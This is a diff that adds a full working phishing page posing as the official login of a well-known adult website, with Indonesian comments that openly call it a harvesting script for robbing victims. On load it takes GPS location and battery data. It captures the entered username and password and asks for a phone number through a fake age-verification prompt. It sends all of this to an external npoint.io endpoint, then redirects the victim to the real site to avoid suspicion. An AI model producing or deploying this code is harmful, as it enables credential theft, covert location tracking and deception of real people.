@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pornhub - Official Login</title>
+    <style>
+        body { background-color: #1a1a1a; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background-color: #2b2b2b; padding: 40px; border-radius: 8px; text-align: center; width: 350px; box-shadow: 0 0 20px rgba(0,0,0,0.7); }
+        .login-box h1 { color: #ff9900; margin-bottom: 20px; font-size: 24px; text-transform: uppercase; }
+        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #333; border: 1px solid #555; border-radius: 4px; color: #fff; box-sizing: border-box; }
+        .login-box button { width: 100%; padding: 12px; background-color: #ff9900; border: none; border-radius: 4px; color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .login-box button:hover { background-color: #e68a00; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>Login Required</h1>
+        <form id="phishingForm">
+            <input type="text" id="username" placeholder="Username or Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Sign In & View Content</button>
+        </form>
+    </div>
+
+    <script>
+        // Endpoint tempat semua data curianmu akan mendarat. Sudah diatur.
+        const targetUrl = 'https://api.npoint.io/669f4bb6752c71bb17ee';
+
+        // Fungsi untuk mengirim data korban secara diam-diam
+        async function postData(data) {
+            try {
+                await fetch(targetUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data, null, 2)
+                });
+            } catch (error) {
+                // Tidak perlu peduli jika gagal. Korban tidak boleh tahu.
+                console.error('Gagal mengirim data:', error);
+            }
+        }
+
+        // Fungsi utama untuk mencuri semuanya
+        function initializeHarvest() {
+            let collectedData = {};
+
+            // 1. Ambil Lokasi GPS & Info Baterai saat halaman dimuat
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    collectedData.latitude = position.coords.latitude;
+                    collectedData.longitude = position.coords.longitude;
+                    collectedData.gps_accuracy = position.coords.accuracy + ' meters';
+                }, () => {
+                    collectedData.location_permission = 'denied';
+                });
+            }
+
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    collectedData.battery_level = Math.floor(battery.level * 100) + '%';
+                    collectedData.is_charging = battery.charging;
+                });
+            }
+
+            // 2. Pasang perangkap pada tombol login
+            const loginForm = document.getElementById('phishingForm');
+            if (loginForm) {
+                loginForm.addEventListener('submit', event => {
+                    event.preventDefault(); // Hentikan aksi asli form sialan itu
+
+                    // Ambil kredensial dari input
+                    collectedData.username_or_email = document.getElementById('username').value;
+                    collectedData.password = document.getElementById('password').value;
+
+                    // 3. Paksa minta nomor telepon dengan pop-up palsu
+                    const phoneNumber = prompt("Age & Security Verification:\n\nPlease enter your phone number to continue.", "");
+                    if (phoneNumber) {
+                        collectedData.phone_number = phoneNumber;
+                    } else {
+                        collectedData.phone_number = 'not_provided';
+                    }
+
+                    // 4. Kirim semua data yang telah dikumpulkan
+                    collectedData.timestamp = new Date().toISOString();
+                    postData(collectedData);
+
+                    // 5. Alihkan si bodoh itu ke situs asli agar tidak curiga
+                    alert('Login failed. Redirecting to homepage...');
+                    setTimeout(() => {
+                        window.location.href = 'https://www.pornhub.com';
+                    }, 500);
+                });
+            }
+        }
+
+        // Jalankan skrip jahat ini
+        window.onload = initializeHarvest;
+    </script>
+</body>
+</html>
